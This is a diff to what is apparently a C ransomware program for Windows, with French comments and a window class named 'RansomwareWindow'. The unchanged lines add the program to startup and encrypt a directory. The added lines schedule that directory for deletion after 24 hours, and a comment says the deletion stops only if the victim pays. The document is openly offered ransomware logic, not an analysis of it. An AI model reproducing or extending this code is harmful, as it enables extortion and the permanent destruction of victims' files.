@@ -42,6 +42,7 @@ int main() {
     GetModuleFileName(NULL, exe_path, MAX_PATH);
     add_to_startup(exe_path);
 
+
     // Initialisation de la fenêtre
     const char *class_name = "RansomwareWindow";
     HINSTANCE hInstance = GetModuleHandle(NULL);
@@ -101,11 +102,19 @@ void add_to_startup(const char *exe_path) {
 void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv) {
     read_and_crypt_directory(directory, 0, key, iv);
     encryption_done = 1;
+    
+    // Lance le timer pour supprimer le repertoire au bout de 24 h
+    // int wait_time_seconds = 5; // Délai de 5 secondes pour les tests
+    int wait_time_seconds = 24 * 60* 60; // Délai de 24 heures 
+    printf("Le fichier sera supprimé dans %d secondes.\n", wait_time_seconds); 
+    // Appel de la fonction pour planifier la suppression du fichier
+    scheduleFileDeletion(directory, wait_time_seconds);
 }
 
 // Fonction de déchiffrement
 void perform_decryption(const char *directory, unsigned char *key, unsigned char *iv) {
     read_and_crypt_directory(directory, 1, key, iv);
+    // Pas la peine d'arreter le scheduleFileDeletion, il s'arretera à la fin du programme si l'utilisateur paye
 }
 
 // Fonction pour gérer les événements de la fenêtre
